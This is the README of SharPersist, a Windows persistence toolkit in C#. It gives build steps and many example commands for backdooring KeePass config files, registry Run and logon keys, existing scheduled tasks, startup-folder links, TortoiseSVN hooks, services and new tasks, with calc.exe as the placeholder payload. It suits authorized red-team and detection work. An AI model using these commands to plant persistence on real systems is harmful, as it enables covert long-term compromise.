# SharPersist
Windows persistence toolkit written in C#. **For detailed usage information on each technique, see the WIKI.**

# RELEASE
* Public version 1.0 of SharPersist can be found in the "Releases" section


# INSTALLATION/BUILDING

## Pre-Compiled 

* Use the pre-compiled binary in the "Releases" section

## Building Yourself

Take the below steps to setup Visual Studio in order to compile the project yourself. This requires a couple of .NET libraries that can be installed from the NuGet package manager.

* Load the Visual Studio project up and go to "Tools" --> "NuGet Package Manager" --> "Package Manager Settings"
* Go to "NuGet Package Manager" --> "Package Sources"
* Add a package source with the URL "https://api.nuget.org/v3/index.json"
* Install the Fody NuGet package, which will also install the Costura.Fody package. The older version of Fody (4.2.1) is needed, so that you do not need Visual Studio 2019.
  * `Install-Package Fody -Version 4.2.1`
* In Solution Explorer on right-hand side of Visual Studio, right-click "References", then select "Add Reference". Select "Microsoft.CSharp".
* Install the TaskScheduler package
  * `Install-Package TaskScheduler -Version 2.8.11`
* You can now build the project yourself!

<b>Note: </b>.NET Framework 4 is required to use this tool and to compile it. This is due to the Fody package requiring a minimum of .NET Framework 4. This package is responsible for bundling external .NET assemblies (TaskScheduler) into the compiled SharPersist binary.

# ARGUMENTS/OPTIONS

* <b>-t </b> - persistence technique
* <b>-c </b> - command to execute
* <b>-a </b> - arguments to command to execute (if applicable)
* <b>-f </b> - the file to create/modify
* <b>-k </b> - registry key to create/modify
* <b>-v </b> - registry value to create/modify
* <b>-n </b> - scheduled task name or service name
* <b>-m </b> - method (add, remove, check, list)
* <b>-o </b> - optional add-ons
* <b>-h </b> - help page

 
# PERSISTENCE TECHNIQUES
* keepass - backdoor keepass config file
* reg - registry key addition/modification
* schtaskbackdoor - backdoor scheduled task by adding an additional action to it
* startupfolder - lnk file in startup folder
* tortoisesvn - tortoise svn hook script
* service - create new windows service
* schtask - create new scheduled task


# METHODS
* add - add persistence technique
* remove - remove persistence technique
* check - perform dry-run of persistence technique
* list - list current entries for persistence technique


# OPTIONAL ADD-ONS
* env - optional add-on for env variable obfuscation for registry
* hourly - optional add-on for schtask frequency
* daily - optional add-on for schtask frequency
* logon - optional add-on for schtask frequency


# REGISTRY KEYS
* hklmrun
* hklmrunonce 
* hklmrunonceex 
* hkcurun
* hkcurunonce 
* logonscript (reg value not needed)
* stickynotes (reg value not needed)
* userinit (reg value not needed)


# EXAMPLES
## ADDING PERSISTENCE TRIGGERS (ADD)

**KeePass**

`SharPersist -t keepass -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -f "C:\Users\username\AppData\Roaming\KeePass\KeePass.config.xml" -m add `


**Registry**

`SharPersist -t reg -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -k "hkcurun" -v "Test Stuff" -m add`

`SharPersist -t reg -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -k "hkcurun" -v "Test Stuff" -m add -o env`

`SharPersist -t reg -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -k "logonscript" -m add`



**Scheduled Task Backdoor**

`SharPersist -t schtaskbackdoor -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Something Cool" -m add`


**Startup Folder**

`SharPersist -t startupfolder -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -f "Some File" -m add`


**Tortoise SVN**

`SharPersist -t tortoisesvn -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -m add`


**Windows Service**

`SharPersist -t service -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Some Service" -m add`


**Scheduled Task**

`SharPersist -t schtask -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Some Task -m add`

`SharPersist -t schtask -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Some Task -m add -o hourly`


## REMOVING PERSISTENCE TRIGGERS (REMOVE)


**KeePass**

`SharPersist -t keepass -f "C:\Users\username\AppData\Roaming\KeePass\KeePass.config.xml" -m remove`


**Registry**

`SharPersist -t reg -k "hkcurun" -v "Test Stuff" -m remove`

`SharPersist -t reg -k "hkcurun" -v "Test Stuff" -m remove -o env`

`SharPersist -t reg -k "logonscript" -m remove`



**Scheduled Task Backdoor**

`SharPersist -t schtaskbackdoor -n "Something Cool" -m remove`


**Startup Folder**

`SharPersist -t startupfolder -f "Some File" -m remove`


**Tortoise SVN**

`SharPersist -t tortoisesvn -m remove`


**Windows Service**

`SharPersist -t service -n "Some Service" -m remove`


**Scheduled Task**

`SharPersist -t schtask -n "Some Task" -m remove`

## PERFORM DRY RUN OF PERSISTENCE TRIGGER (CHECK)


**KeePass**

`SharPersist -t keepass -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -f "C:\Users\username\AppData\Roaming\KeePass\KeePass.config.xml" -m check`


**Registry**

`SharPersist -t reg -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -k "hkcurun" -v "Test Stuff" -m check`

`SharPersist -t reg -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -k "hkcurun" -v "Test Stuff" -m check -o env`

`SharPersist -t reg -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -k "logonscript" -m check`



**Scheduled Task Backdoor**

`SharPersist -t schtaskbackdoor -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Something Cool" -m check`


**Startup Folder**

`SharPersist -t startupfolder -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -f "Some File" -m check`


**Tortoise SVN**

`SharPersist -t tortoisesvn -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -m check`


**Windows Service**

`SharPersist -t service -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Some Service" -m check`


**Scheduled Task**

`SharPersist -t schtask -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Some Task" -m check`

`SharPersist -t schtask -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Some Task" -m check -o hourly`


## LIST PERSISTENCE TRIGGER ENTRIES (LIST)


**Registry**

`SharPersist -t reg -k "hkcurun" -m list`


**Scheduled Task Backdoor**

`SharPersist -t schtaskbackdoor -m list`

`SharPersist -t schtaskbackdoor -m list -n "Some Task"`

`SharPersist -t schtaskbackdoor -m list -o logon`



**Startup Folder**

`SharPersist -t startupfolder -m list`


**Windows Service**

`SharPersist -t service -m list`

`SharPersist -t service -m list -n "Some Service"`


**Scheduled Task**

`SharPersist -t schtask -m list`

`SharPersist -t schtask -m list -n "Some Task"`

`SharPersist -t schtask -m list -o logon`
